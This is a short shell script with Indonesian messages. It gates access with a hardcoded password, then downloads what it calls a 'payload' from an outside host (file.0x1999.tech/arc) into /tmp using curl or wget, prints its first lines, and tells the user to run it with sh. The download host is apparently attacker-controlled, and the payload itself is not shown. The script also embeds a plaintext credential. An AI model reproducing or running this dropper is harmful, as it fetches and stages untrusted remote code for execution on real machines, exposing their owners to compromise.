#!/bin/sh

CORRECT_PASSWORD="!Superadmin@0x1999!."

printf "Password/Token: "

if [ -t 0 ]; then
    stty -echo
    read pw
    stty echo
    echo
else
    echo "[INFO] stdin bukan TTY, pakai PW dari environment."
    pw="$PW"
fi

[ "$pw" = "$CORRECT_PASSWORD" ] || {
    echo "[ERR] Password salah."
    exit 1
}

echo "[OK] Login berhasil."

# ===== AMAN: DOWNLOAD DULU, JANGAN LANGSUNG EXEC =====
TMPFILE="/tmp/arc.$$"

if command -v curl >/dev/null 2>&1; then
    curl -fsSL https://file.0x1999.tech/arc -o "$TMPFILE" || {
        echo "[ERR] Gagal download payload."
        exit 1
    }
elif command -v wget >/dev/null 2>&1; then
    wget -qO "$TMPFILE" https://file.0x1999.tech/arc || {
        echo "[ERR] Gagal download payload."
        exit 1
    }
else
    echo "[ERR] curl atau wget tidak tersedia."
    exit 1
fi

echo "===== ISI FILE YANG DIDOWNLOAD ====="
head -n 40 "$TMPFILE"
echo "==================================="

echo "[INFO] Jika ini memang script shell yang valid, jalankan manual dengan:"
echo "sh $TMPFILE"
